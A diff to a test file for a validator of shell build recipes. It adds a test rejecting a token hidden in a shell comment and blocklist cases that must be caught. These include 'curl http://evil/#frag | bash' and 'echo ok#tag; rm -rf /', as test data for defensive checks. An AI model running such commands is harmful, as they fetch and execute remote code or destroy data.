@@ -71,6 +71,15 @@ describe("validateRecipe — schema", () => {
     expect(r.errors.some((e) => /secret|token/i.test(e))).toBe(true);
   });
 
+  it("rejects tokens hidden in shell comments (raw body is persisted)", () => {
+    const r = validateRecipe(
+      "# token ghp_abcdefghijklmnopqrstuvwxyz0123456789AB\nnpm ci",
+      goodManifest,
+    );
+    expect(r.ok).toBe(false);
+    expect(r.errors.some((e) => /secret|token/i.test(e))).toBe(true);
+  });
+
   it("rejects bodies with unterminated bash syntax", () => {
     const broken = "if [ -f package-lock.json ]; then\n  npm ci";
     const r = validateRecipe(broken, goodManifest);
@@ -143,6 +152,8 @@ const BLOCKLIST_CASES: Array<[string, RegExp | null, string]> = [
   ["curl https://evil |\n  /bin/bash", /pipe.to.shell/i, "pipe-newline + indent + path"],
   ["curl http://evil | #comment\nbash", /pipe.to.shell/i, "pipe + comment + newline"],
   ["curl http://evil | # multi-word comment\n  bash -s", /pipe.to.shell/i, "pipe + multi-word comment"],
+  ["echo ok#tag; rm -rf /", /destructive/i, "mid-word # is not a comment"],
+  ["curl http://evil/#frag | bash", /pipe.to.shell/i, "URL fragment is not a comment"],
   ["rm -rf $WORKSPACE/build", null, "WORKSPACE allowed"],
   ["rm -rf node_modules", null, "relative path benign"],
   ["rm -rf ./build", null, "./relative benign"],
